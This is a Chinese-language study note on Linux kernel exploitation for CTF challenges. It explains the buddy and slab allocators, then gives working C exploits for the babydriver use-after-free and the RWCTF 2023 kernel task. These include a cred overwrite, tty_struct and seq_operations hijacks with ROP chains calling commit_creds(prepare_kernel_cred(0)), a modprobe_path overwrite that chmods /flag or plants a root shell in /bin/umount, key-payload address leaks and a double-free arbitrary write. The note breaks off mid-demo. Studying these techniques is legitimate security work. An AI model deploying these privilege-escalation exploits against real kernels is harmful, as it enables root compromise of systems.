#### 节点 区 页的概念

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150511.png)

MC就是一个节点的边标志，对应了CPU组和一段内存，每个节点间独立工作
在这段内存上会进一步划分为不同的区如 ZONE_DMA、ZONE_NORMAL 等
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150642.png)
而每个区呢就像下图所示，每个区都有自己的伙伴系统
#### buddy system
伙伴块，大小相等，地址相邻，都空闲时会合并成更大块

其存在于 区 这一级别，管理区

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105113714.png)

按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为连续的空闲页面的大小，不过单位不是页面数，而是阶，即对于每个下标而言，其中所存储的页面大小为：2^order

分配：
请求内存向2的次方进行对齐，然后选择对应的free_area。取不到就从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中。
释放：
释放到对应的free_arena中，检查伙伴块状态如果也是free的，那就合并进入下一个order

#### slab allocator
三个版本
slab -> slob -> slub

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105115134.png)
kmem_cache 为一个全局的基本的 allocator 组件，用于分配Obj，每个 kmem_cache 代表一种特定大小和类型的内存缓存，用于管理特定类型的对象分配。
每个用于标记不同大小的kmem_cache存在于两个结构体kmalloc_cashes(通过CPU)和kmalloc_dma_caches(不通过CPU)中，这里主要看kmalloc_cashes


kmem_cache主要由2个大模块，kmem_cache_cpu和kmem_cache_node组成
kmem_cache_cpu(按核心)是一个 percpu 变量(每个核心上有一个)，Per-CPU 变量是一种特殊的数据结构，它为系统中的每个 CPU 核心提供了一个独立的变量副本，即针对于当前CPU核心
主要用以表示当前核心正在使用的 slub，当前 CPU 会优先从 kmem_cache_cpu 上取 object

kmem_cache_node(按节点)，每个 NUMA 节点都有一个对应的 kmem_cache_node 实例，分别管理各自节点的内存分配情况
其中主要有2个链表，分别是partial和full
partial：slub链表，slub 上存在着一定数量的空闲 object，但并非全部空闲。
full：slub链表，该 slub 上的所有 object 都被分配出去了。

分配
首先从 kmem_cache_cpu 上取对象，若有则直接返回。
若 kmem_cache_cpu 上的 slub 已经无空闲对象了，对应 slub 会被从 kmem_cache_cpu 上取下，并尝试从 partial 链表上取一个 slub 挂载到 kmem_cache_cpu 上，然后再取出空闲对象返回。
若 kmem_cache_node 的 partial 链表也空了，那就向 buddy system 请求分配新的内存页，划分为多个 object 之后再给到 kmem_cache_cpu，取空闲对象返回上层调用
(\*调用内存分配函数时提供的标志（如 GFP_KERNEL, GFP_ATOMIC 等）会决定从哪个buddy system里取内存页)
释放：
若被释放 object 属于 kmem_cache_cpu 的 slub，直接使用头插法插入当前 CPU slub 的 freelist。
若被释放 object 属于 kmem_cache_node 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist。
若被释放 object 为 full slub，则其会成为对应 slub 的 freelist 头节点，且该 slub 会被放置到 partial 链表。

### 内核题目上手
#### RWCTF 2023 digging into kernel 3
在实际题目中如果能实现任意地址写，就可以修改modprobe_path为/tmp/x，从而实现shellcode执行
原理是当linux系统在运行一个无法识别格式的文件，比如

```shell
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
```

运行dummy时就会以root权限调用/sbin/modprobe(其名字记录在内核全局变量p &modprobe_path)，如果我们按照修改思路，就能执行任意的shell指令

```shell
system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
system("chmod +x /tmp/x");
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
system("chmod +x /tmp/dummy");

# 利用漏洞将modprobe_path改为/tmp/x，最后，执行/tmp/dummy，内核将调起/tmp/x，把flag的权限设置为777
```

由于kpti内核页表隔离，不能ret到用户空间执行rop，所以要在内核栈上存放ROP链
在执行syscall调用的时候，会把所有寄存器的值压到内核栈上，所以我们可以在执行syscall前，把ROP链的各个部分存入各个寄存器中，按照一定顺序就能在栈上形成完整的ROP链(r15应该在栈顶)
“5432px1098”


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610190155.png)

就只需要利用任意地址写，劫持为add_rsp_x_ret的gadget，就可以跳到栈底这块ROP链

但是现在由于开启了kalsr，所以需要泄露地址







### 结构体总结
写在前面，exp的静态编译，编译好放进cpio重新打包即可
```shell
gcc exp.c -static -masm=intel  -o exp 
```

关于babydriver的漏洞点：
使用open()打开设备文件时该驱动会分配一个chunk，该chunk的指针储存于全局变量babydev_struct中，ioctl可以重新申请这块内容，并自定义其len字段

```c
int babyopen(struct inode *inode, struct file *filp)
{
	babydev_struct.device_buf = kmalloc(64,0x24000C0);
	babydev_struct.device_buf_len = 64;
	printk("device open\n");
	return 0;
}
long babyioctl(struct file *fd, unsigned int cmd, unsigned long arg)
{
	size_t v4;	

	v4 = arg;
	if ( cmd == 65537 )
	{
	  kfree(babydev_struct.device_buf);
	  babydev_struct.device_buf = kmalloc(v4,0x24000C0);
	  babydev_struct.device_buf_len = v4;
	  printk("alloc done\n");
	  return 0LL;
	}
	else
	{
	  printk("defalut:arg is %ld",arg);
	  return -22;
	}
}
```

babyrelease在释放后并没有置空，所以还能执行write，read等操作（只对babydev_struct.device_buf进行校验）

```c
int babyrelease(struct inode *inode, struct file *filp)
{
	kfree(babydev_struct.device_buf);
	printk("device release\n");
	return 0;
}
```

关于题目启动的部分
```shell
./qemu-system-x86_64 \
  -initrd rootfs.cpio \ # 指定根文件系统
  -kernel bzImage \ # 指定启动内核镜像
  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \ 
  # ttys0是linux上的第一个串口，在qemu中，它会映射到当前终端，相对应的tty0指代的就是图形界面
  # initrd即ram disk，内存里用于启动的虚拟磁盘，初始 RAM 文件系统。这里把/dev/ram 设备当作根目录 / 挂载
  # 一旦内核出现 Oops 错误就触发 panic（方便调试）
  # panic 后 1 秒自动重启（防止卡死）
  -monitor /dev/null \
  -m 64M \
  --nographic \
  -smp cores=1,threads=1 \ # smp即对称多核处理，每颗核心都是对等的无主次之分，这里就是启用这样的机制，这里只用单核单线程
  -cpu kvm64,+smep \ # 使用支持 SMEP 的 CPU 模型 模拟开启 SMEP 情况
  -L ./pc-bios/ # 使用本地的 BIOS 文件夹

```



学习文章：
https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D

| 结构体/能力 | 控制流劫持 | 泄露堆 | 泄露栈 | 泄露内核地址 | 结构体大小 |
| ---- | ---- | ---- | ---- | ---- | ---- |
| cred | x | √ | x | x | 0xa8 (kmalloc-192) |
| tty_struct | √ | √ | x | √ | 0x2e0 (kmalloc-1024) |
| seq_operations | √ | x | x | √ | 0x20 (kmalloc-32) |
| subprocess_info | √ | √ | x | √ | 0x60 (kmalloc-128) |
| pipe_buffer | √ | x | x | √ | 0x280 (kmalloc-1024) |
| shm_file_data | x | √ | x | √ | 0x20 (kmalloc-32) |
| msg_msg | x | √ | x | x | 0x31~0x1000 (>= kmalloc-64) |
| timerfd_ctx | x | √ | x | √ | 0xf0 (kmalloc-256) |
pt_regs 解决 -》smeb 不能执行用户态的ROP，所以放到内核栈上（太短的话，可以在内核栈上mov rsp,rax实现栈迁移到用户栈上然后修改掉CR4变量）

#### cred
这里的几个函数都是针对于babydev_struct这个全局变量操作，而fd仅仅作为参数传入，但是确是write/ioctl/read等功能的必要参数
要利用UAF，先开2个句柄，利用ioctl修改全局chunk大小为0xa8即cred的大小，然后释放chunk，然后fork一个子进程，就会申请掉这个0xa8，然后用2号句柄执行write往这个全局chunk里写0即可

值得注意的点
调用close后，在内核空间，会进入 sys_close() →__close_fd() → filp_close()：
```c
int filp_close(struct file *filp, fl_owner_t id)
{
    if (filp->f_op->release)
        filp->f_op->release(inode, filp);  // ① 调用驱动中定义的 release
    fput(filp);                            // ② 减少 file 引用计数，如果为0就释放
}
```

fput会关闭句柄

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);			

	ioctl(fd1,0x10001,0xa8);					
	close(fd1);												

	pid_t fpid; 
	fpid=fork(); 							
	if (fpid < 0) {
		printf("error in fork!\n"); 
		exit(0);
	}else if (fpid == 0) {
		printf("child pid is : %d\n",getpid());
        char zeros[30] = {0};
        write(fd2,zeros,28);				
	    if(getuid() == 0){
		    system("/bin/sh");					
		    exit(0);
	    }
	}else {
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	printf("%d: going to close fd2\n",getpid());
	close(fd2);					

	return 0;
}
```


#### tty_struct
攻击链条全过程

| 阶段 | 说明                                                  |
| -- | --------------------------------------------------- |
| 1  | `open()` + `ioctl()` → 分配并释放一块堆内存（UAF）              |
| 2  | `open("/dev/ptmx")` 堆喷 → 分配到 tty\_struct 到 UAF 区    |
| 3  | `read(fd2)` → 读取堆上 tty\_struct                      |
| 4  | 修改其 `.ops` 指针为伪造的 `tty_operations`                  |
| 5  | 再次 `write(fd2)` 写回                                  |
| 6  | `write(fd_tty,...)` 触发函数指针跳转                        |
| 7  | gadget `mov rsp, rax` 实现栈迁移                         |
| 8  | 用户空间 ROP 链调用 `commit_creds(prepare_kernel_cred(0))` |
| 9  | `iretq` 返回用户态 → `system("/bin/sh")`                 |

在开始后续得内容之前，需要回顾一些知识点
bzImage 是压缩过的 Linux 内核启动镜像，用来启动虚拟机或真实机器的内核镜像。vmlinux被压缩成 gzip 格式嵌入在 bzImage 里

| 文件        | 作用            | 是否可调试               |
| --------- | ------------- | ------------------- |
| `bzImage` | 可启动的压缩内核      | ❌ 无符号表，**不能用于 GDB** |
| `vmlinux` | 编译后的完整 ELF 内核 | ✅ 包含符号表，可调试         |
要进行分析我们得先拿到vmlinux，这个最好是提前准备，这里用到的linux内核版本为4.4.72
也可以用linux自带的工具提取，这样提取的缺少调试信息，但是可以用来找gadget，导出后用vscode搜索即可

```
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
ROPgadget --binary ./vmlinux > ropgadget.txt
# 只要没开kalsr，内核地址固定不变，ko的位置理论上是随机分配的，但是在及其干净的内存布局下
```

在做的时候我们通常会以root模式来进行调试，所以我们还要配置一个这道题的调试环境
+ 一个是boot.sh上是否存在地址随机化，默认为开启状态，应该关闭 nokaslr
+ 另一个就是修改文件系统里的init文件，往往涉及了权限的设置，应该切换到root

关于init

```shell
#!/bin/sh
echo "{==DBG==} INIT SCRIPT"
# 
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug # 用于访问 debug 接口（比如 ftrace）
mount -t tmpfs none /tmp # 挂载内存临时文件系统，/tmp 必须可写，某些程序需要

mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

insmod /babydriver.ko           # load ko
mdev -s                         # mdev -s 扫描设备并生成 /dev 下的设备节点，例如 /dev/babydev 就是这样生成的
chmod 777 /dev/babydev
chmod 666 /dev/ptmx

echo -e "{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
# setsid /bin/cttyhack setuidgid 1000 /bin/sh             #normal user 启动一个新的session，	自动绑定 /dev/console 给当前进程
exec /bin/sh                                           #root

umount /proc    # 这里开始就是退出/bin/sh后的流程，取消挂载，进入强制关机
umount /sys/kernel/debug
umount /sys
umount /tmp
poweroff -d 0  -f # poweroff -d 120 -f &有时候会有这种定时关机，注意注释掉
```

有了root权限就可以查看一些内核函数的地址，同样`/proc/kallsyms`也用来看内核基地址

```
grep prepare_kernel_cred  /proc/kallsyms
grep commit_creds  /proc/kallsyms
grep ko_test_init  /proc/kallsyms
grep babyrelease /proc/kallsyms


lsmod 也能看到模块基址
内核基地址用：
cat /proc/kallsyms | grep startup_64
```

同时支持在调试的时候添加部分符号信息

| 参数   | 含义                                                              |
| ---- | --------------------------------------------------------------- |
| `-s` | 等价于 `-gdb tcp::1234`，在端口 `1234` 上启动 GDB 调试服务                    |
| `-S` | 启动后**挂起 CPU（暂停运行）**，等待 GDB 附加，**直到你在 GDB 中输入 `continue` 才启动内核** |


```shell
一个终端
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -S -s

另一个终端
pwndbg> file ./vmlinux
pwndbg> target remote :1234
pwndbg> add-symbol-file ./xxx.ko 0xffffffffa0000000 # 基地址
pwndbg> b start_kernel
pwndbg> c
```


回顾一下整个利用过程，到第七步触发到gadget(mov rsp, rax)开始栈迁移，此时rax里存放的时tty_ops的地址，但是栈迁移到tty_ops开头由于我们在ops内有函数布局(+0x38处write)，所以距离不够还要再次迁移，用pop_rax+ROP链_addr+mov_rsp_rax

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610123114.png)

tty结构体0x2e0字节大小，如下+0x18处为tty_ops

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610123131.png)

```c
// test.c
// gcc test.c -static -masm=intel  -o test
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff818855cf;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
    size_t pop_rax = 0xffffffff8101c216;        // pop rax; ret; 
    
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",O_RDWR | O_NOCTTY);
    if(fd_tty < 0){
        printf("[+] cannot open /dev/ptmx\n");
        printf("[+] ptmx errorno: %d\n",errno);
        goto exit;
    }

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);
exit:
    close(fd2);
	return 0;
}
```

#### seq_operations(seq_operations + pt_regs)

在用户态执行open("/proc/self/stat",0);后，内核中的调用过程如下图所示(自下往上)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116173829.png)

#2 里 内核中会调用single_open()函数，然后为struct seq_operations 结构体申请一段内存空间（0x20字节大小）,然后用户态获得一个文件描述符fd

在用户态执行read(fd,buf,size)时，会调用#0 single_start，这个指针来自struct seq_operations->start
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116174040.png)


因此，如果能在open后改掉结构体里的start指针(add_rsp_xxx)，就能在read(pt_regs->syscallread+rop_chain)前完成劫持


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

int fd_stat;
__uint64_t temp_buf[4];
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b （ret）
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t fake_stack[20];
__uint64_t fake_stack_addr = &fake_stack;

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}



__uint64_t gadget1 = 0xffffffff815f5951;// add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret

int main(){
    save_status();
    printf("fake_stack_addr: 0x%llx\n",fake_stack_addr);

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);

    fd_stat = open("/proc/self/stat",0);
    write(fd2,&gadget1,8);

    fake_stack[0] = pop_rax_ret;
    fake_stack[1] = 0x6f0;
    fake_stack[2] = mov_cr4_rax_ret;
    fake_stack[3] = 0xffff;         // rbp, padding
    fake_stack[4] = get_root;
    fake_stack[5] = swapgs_ret;
    fake_stack[6] = iretq;
    fake_stack[7] = get_shell;
    fake_stack[8] = user_cs;
    fake_stack[9] = user_rflags;
    fake_stack[10] = user_sp;
    fake_stack[11] =  user_ss;

    __asm__(
    "mov r15, 0x15151515;"
    "mov r14, 0x14141414;"      // 4
    "mov r13, mov_rsp_rax_ret;"      // 3
    "mov r12, fake_stack_addr;"      // 2
    "mov r11, 0x11111111;"
    "mov r10, 0x10101010;"      // r10
    "mov rbp, 0xbbbbbbbb;"      // 5
    "mov rbx, pop_rax_ret;"      // 1
    "mov r9, 0x99999999;"       // r9
    "mov r8, 0x88888888;"       //r8
    "mov rcx, 0xcccccccc;"
    "xor rax, rax;"
    "mov rdx, 0x20;"
    "mov rsi, temp_buf;"
    "mov rdi, fd_stat;"
    "syscall"
    );
    close(fd_stat);
	close(fd2);
    return 0;
}
```

pt_regs模板

```c
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, 0x14141414;"      // 1
        "mov r13, 0x13131313;"      // 2
        "mov r12, 0x12121212;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, 0x10101010;"      // 7
        "mov rbp, 0xaaaaaaaa;"      // 4
        "mov rbx, 0xbbbbbbbb;"      // 5
        "mov r9, 0x99999999;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
```

+modprobe_path(省去栈迁移)

```c

int g_fd;
int seq_fd;
int64_t seq_read_buf[4];

int prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("chmod +x /tmp/x");//0x782f706d742f
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}

int64_t add_rsp_170_ret = 0xffffffff819d9f4c;
int64_t pop_rax_ret = 0xffffffff81000ddb;
int64_t pop_rdi_ret = 0xffffffff8106ab4d;
int64_t mov_ptr_rdi_rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;
int64_t modprobe_path_addr = 0xFFFFFFFF828510A0;
int64_t do_task_dead_func = 0xFFFFFFFF810A3190;
int64_t pop_rbp_ret = 0xffffffff810679ef;

int hijack(){
    int OBJ_SIZE = 0x20;
    char * tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,'a',OBJ_SIZE);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kfree(0);

    seq_fd = open("/proc/self/stat",0);
    rwctf_ioctl_kfree(0);
    char fake_seq_operations[OBJ_SIZE];
    memset(fake_seq_operations,'0',OBJ_SIZE);
    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;
    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;

    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, pop_rax_ret;"      // 1
        "mov r13, 0x782f706d742f;"      // 2
        "mov r12, pop_rdi_ret;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, mov_ptr_rdi_rax_ret;"      // 7
        "mov rbp, modprobe_path_addr;"      // 4
        "mov rbx, pop_rbp_ret;"      // 5
        "mov r9, do_task_dead_func;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
}


int main(){
    g_fd  = open("/dev/rwctf",2);
    prepare();
    hijack();
}
```

#### modprobe_path

```shell
# 普通权限即可修改该值,并且该程序具有root权限
cat /proc/sys/kernel/modprobe
-> /sbin/modprobe
```

当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，就会调用这个程序
```
（1）do_execve()
（2）do_execveat_common()
（3）bprm_execve()
（4）exec_binprm()
（5）search_binary_handler()
（6）request_module()
（7）call_usermodehelper() -> /sbin/modprobe
```

2017年从linux4.11开始就提出了CONFIG_STATIC_USERMODEHELPER来防止modprobe_path被改
所以要保证CONFIG_STATIC_USERMODEHELPER未启用

```shell
# 其实没法直接判断是否开启
grep CONFIG_STATIC_USERMODEHELPER /boot/config-$(uname -r)
```


#### user_key_payload(泄露地址)

add_key函数原型

```c
#include <sys/types.h>
#include <keyutils.h>

key_serial_t add_key(const char *type, const char *description,const void *payload, size_t plen,key_serial_t keyring);
```

其中：
type 用于指定密钥的类型。这个参数决定了密钥的用途和行为。常见的类型包括 "user" 和 "keyring"
description是密钥的描述。这是一个字符串，用于唯一标识密钥。系统会根据这个描述来区分不同的密钥。
payload 是指向包含密钥数据的缓冲区的指针。这个缓冲区包含了密钥的实际内容。
plen 是缓冲区的大小，以字节为单位
keyring 是密钥环的序列号，指定该密钥应该被添加到哪个密钥环中。
密钥环本身也是一种特殊的密钥，可以包含其他密钥。

执行流程：
* 首先会检测参数是否正确
* 分配对象obj1，用来存储密钥数据。包含密钥的type、description、有效期、访问权限以及payload指针
* 将payload拷贝到obj2(plen)中
* 然后将对应的内容再次拷贝到obj3和obj4(plen+0x18)中
* 释放obj1和obj2
* 操作完成后，系统返回新创建的密钥的唯一标识符（密钥 ID）。这个 ID 可用于后续操作，如查询、修改或删除密钥。

注意的点：
拷贝obj1和obj2：
description的拷贝是使用 strndup_user 函数从用户空间复制描述字符串到内核空间，memdup_user()，kmalloc_track_caller和copy_from_user
payload的拷贝是kvmalloc(plen, GFP_KERNEL) 分配 plen 大小的对象后使用 copy_from_user() 进行拷贝
(obj1和obj2是临时对象，在系统调用结束时会被释放)


keyctl_read泄露：
其中 obj4 为一个 user_key_payload 结构体，有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）
```c
struct user_key_payload {
    struct rcu_head rcu;        /* RCU destructor */
    unsigned short  datalen;    /* length of this data */
    char        data[] __aligned(__alignof__(u64)); /* actual data */
};

//...

struct callback_head {
    struct callback_head *next;
    void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

keyctl() 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 user_key_payload->datalen 决定
可以利用题目提供的 UAF 将user_key_payload->datalen 改大，从而完成越界读。

##### 函数C代码
```c
define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEYCTL_REVOKE			3	/* revoke a key */
#define KEYCTL_READ			11	/* read a key or keyring's contents */

int key_revoke(int key_id)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_REVOKE,
        key_id,
        0,
        0,
        0
    );
}

int key_read(int key_id, char *retbuf, int retbuf_len)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_READ,
        key_id,
        retbuf,
        retbuf_len
    );
}

int key_alloc(char* description, char* payload, int payload_len)
{
    return syscall(
        __NR_add_key,
        "user",
        description,
        payload,
        payload_len,
        KEY_SPEC_PROCESS_KEYRING
    );
}
```

##### UAF+add_key+keyctl_read

首先要利用UAF释放2个1堆块，使用add_key（des和payload长度要不同）申请4个堆块，其中2个payload堆块便可以申请到0和1的位置。由于没有编辑功能这里释放再重新申请，修改user_key_payload->datalen为0x1000。

接下来执行read读取payload到0x1000大小的用户态堆块中，再去查看是否有内核地址
内核地址事FF FF FF FF 80开头   "四F8"

```c
int leak(){
    int OBJ_SIZE = 0x100;
    char *tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,"x",0x100);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kmalloc(1,OBJ_SIZE,tmp_buf);

    rwctf_ioctl_kfree(1);
    rwctf_ioctl_kfree(0);

    //-----------------------get add_key------------------------------
    int ADD_KEY_SIZE = OBJ_SIZE - size_user_key_payload;
    char *payload = malloc(ADD_KEY_SIZE);
    memset(payload,"y",ADD_KEY_SIZE);
    int key_id = key_alloc("description234",payload,ADD_KEY_SIZE);//add obj*4 user_key_payload is 1
    rwctf_ioctl_kfree(1);// free user_key_payload
    
    *(unsigned long long *)&tmp_buf[0] = 0;
    *(unsigned long long *)&tmp_buf[0x8] = 0;
    *(unsigned long long *)&tmp_buf[0x10] = 0x1000;
    rwctf_ioctl_kmalloc(1,ADD_KEY_SIZE,tmp_buf);
    //----------------------key_ctl->read------------------------------
    char *retbuf = malloc(0x1000);
    memset(retbuf,0,0x1000);
    int keycount = key_read(key_id,retbuf,0x1000);
    // hexdump(retbuf,0x1000);
    int64_t leak_addr = *(int64_t *)&retbuf[0x210];
    kernel_base = leak_addr-0xffffffff82225040+0xFFFFFFFF81000000;
    printf("[+] leak : 0x%lx\n",leak_addr);
    printf("[+] kernel_base : 0x%lx\n",kernel_base);
}
```

#####  如果堆上没有地址->key_revoke堆喷地址

```c
_x64_sys_keyctl() -> keyctl_revoke_key() -> key_revoke() -> user_revoke() -> call_rcu()
```

最后会将 user_key_payload 结构体的 rcu.func 设置成user_free_payload_rcu()函数的地址
（nokaslr的情况下是0xffffffff813d8210）

泄露的0x1000没有内核地址，可以考虑用此方法
```c
    //------------------------heap spary-------------------------------
    //------------------------add srand key----------------------------
    int key_id_test[30];
    srand((unsigned)time(NULL));
    char *tmp_desc = malloc(20);
    memset(tmp_desc, 0, 20);
    for (int i = 0; i < 20; i++)
    {
        snprintf(tmp_desc, 20, "a%x", rand());
        key_id_test[i] = key_alloc(tmp_desc,payload,ADD_KEY_SIZE);//size 
    }
    //------------------------key_ctl->revoke--------------------------
    for (int i = 0; i < 20; i++)
    {
        key_revoke(key_id_test[i]);
    }
```




#### double free

判断是否存在该漏洞的方法
在UAF的前提下
查看bzImage中kmalloc函数的实现，prefetcht0指令临近的前几条指令没有xor指令，可以确定本题未开启slab_freelist_hardened 防护

比如申请0x20的obj，然后free2次，效果如图

```c
// 0 <- 0
0xffff8880043a7260:     0x6161616161616161      0x6161616161616161
0xffff8880043a7270:     0xffff8880043a7260      0x6161616161616161
```

申请一个然后改掉这个+0x10的位置，再申请2次

```c
// 0 <- 0 <- aim_addr
```

```C
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);
    rwctf_ioctl_kfree(0);                       // double free

	memcpy(buf+0x10,target_addr_p,0x8);         // edit fd
	rwctf_ioctl_kmalloc(0,OBJSIZE,buf);         // edit fd
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);         //随意
    rwctf_ioctl_kmalloc(0,OBJSIZE,target_cont_p);       // aaw
```


#### msg_msg（消息队列函数泄露地址）


msgget、msgctl、msgsnd、msgrcv

创建一个消息队列，并往消息队列中写入数据的过程中(msgsnd())，内核态会为“msg_msg结构体+用户数据”申请一段内存空间。

demo

```c
#include <sys/types.h>
#include <sys/ipc.h>
